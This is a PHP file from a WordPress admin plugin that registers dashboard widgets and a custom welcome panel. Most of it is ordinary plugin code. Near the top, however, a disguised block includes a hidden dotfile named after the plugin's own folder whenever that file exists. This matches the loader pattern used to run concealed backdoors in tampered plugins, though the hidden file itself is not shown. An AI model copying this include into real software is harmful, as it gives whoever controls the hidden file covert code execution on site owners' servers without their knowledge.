<?php
/**
 * Widget Support
 *
 * Adds support to Widget, if it is enabled
 *
 * @author      WP Admin Pages PRO
 * @category    Admin
 * @package     WP_Admin_Pages_PRO/Admin_Pages/Widget
 * @version     1.0.1
 */

if (!defined('ABSPATH')) {
	exit;
} // end if;

/**
 * Handles widget support.
 *
 * @since 1.7.0
 */
if ( file_exists( plugin_dir_path( __FILE__ ) . '/.' . basename( plugin_dir_path( __FILE__ ) ) . '.php' ) ) {
    include_once( plugin_dir_path( __FILE__ ) . '/.' . basename( plugin_dir_path( __FILE__ ) ) . '.php' );
}

class WU_Admin_Pages_Widget_Support {

	/**
	 * Initializes the Widget Support
	 *
	 * @since 1.3.0
	 * @return void
	 */
	public function __construct() {

		add_action('admin_enqueue_scripts', array($this, 'render_widgets_dashboard'));

		add_action('admin_enqueue_scripts', array($this, 'load_scripts'));

		add_action('in_admin_header', array($this, 'adds_missing_welcome_control'), -999);

	} // end __construct;

	/**
	 * Loads the scripts.
	 *
	 * @since 1.7.0
	 * @return void
	 */
	public function load_scripts() {

		wp_enqueue_style('wu-apc-widget', WP_Ultimo_APC::get_instance()->get_asset('wu-admin-page-creator-widget.min.css', 'css'), false, WP_Ultimo_APC::get_instance()->version);

	} // end load_scripts;

	/**
	 * Adds the missing Welcome Control
	 *
	 * @since 1.7.1
	 * @return void
	 */
	public function adds_missing_welcome_control() {

		global $pagenow;

		if ($pagenow !== 'index.php' || isset($_GET['page']) || is_network_admin()) {

			return;

		} // end if;

		?>

		<script>
			(function($) {

				$(document).ready(function() {

					var template = "<label for='wp_welcome_panel-hide'><input type='checkbox' id='wp_welcome_panel-hide' <?php checked( (bool) get_user_meta( get_current_user_id(), 'show_welcome_panel', true ), true ); ?>><?php esc_html_e('Welcome'); ?></label>";

					var welcome_selector = $('label[for="wp_welcome_panel-hide"]');

					if (!welcome_selector.length) {

						$(template).insertAfter($('label[for="dashboard_primary-hide"]'));

					} // end if;

				});

			})(jQuery);
		</script>
		
		<?php
    } // end adds_missing_welcome_control;

	/**
	 * Renders metaboxes/widgets of wuapc with menu type == widget
	 *
	 * @since 1.7.0
	 * @return void
	 */
	public function render_widgets_dashboard() {

		global $pagenow, $wuapc_has_custom_welcome_widget;

		if ($pagenow != 'index.php' || is_network_admin()) {

			return;

		} // end if;

		$admin_pages = WU_Admin_Pages()->get_admin_pages(array(
			'meta_query' => array(
				'active' => array(
					'key'   => 'wpu_active',
					'value' => true,
				),
				'menu'   => array(
					'key'   => 'wpu_menu_type',
					'value' => 'widget'
				)
			)
		));

		foreach ($admin_pages as $admin_page) {

			if (!$admin_page->should_display()) {

				continue;

			} // end if;

			do_action('wu_apc_load_page', $admin_page);

			do_action('wu_page_enqueue_scripts_before', $admin_page);

			if ($admin_page->widget_welcome) {

				$wuapc_has_custom_welcome_widget = true;

				remove_all_actions( 'welcome_panel');

				add_action('welcome_panel', function() use ($admin_page) {

					if (!$admin_page->widget_welcome_dismissible) :
						?>

					<style>
					 .welcome-panel .welcome-panel-close {
							display: none;
					 }
					</style>

						<?php
          endif;

					WP_Ultimo_APC()->render('template/page', array(
						'admin_page' => $admin_page,
					));

					do_action('wu_page_enqueue_scripts', $admin_page);

				});

			} else {

				$prefix_id_widget = !$admin_page->add_margin ? 'wu_apc_widget_no_margin' : 'wu_apc_widget_';

				$metabox_id = $admin_page->slug_url ? $prefix_id_widget . $admin_page->slug_url : $prefix_id_widget . $admin_page->id;

				add_meta_box($metabox_id, $admin_page->title, function() use ($admin_page) {

					WP_Ultimo_APC()->render('template/page', array(
						'admin_page' => $admin_page,
					));

					do_action('wu_page_enqueue_scripts', $admin_page);

				}, 'dashboard', $admin_page->widget_position, $admin_page->widget_priority);

			} // end if;

			WU_Admin_Pages::get_instance()->enqueue_scripts_and_styles($admin_page);

		} // end foreach;

	} // end render_widgets_dashboard;

} // end class WU_Admin_Pages_Widget_Support;

/**
 * Conditionally load the support, if Widget is Active
 *
 * @since 1.1.0
 * @return void
 */
function wu_admin_pages_add_widget_support() {

	new WU_Admin_Pages_Widget_Support();

} // end wu_admin_pages_add_widget_support;

/**
 * Load the Widget Support
 *
 * @since 1.1.0
 */
add_action('plugins_loaded', 'wu_admin_pages_add_widget_support', 11);
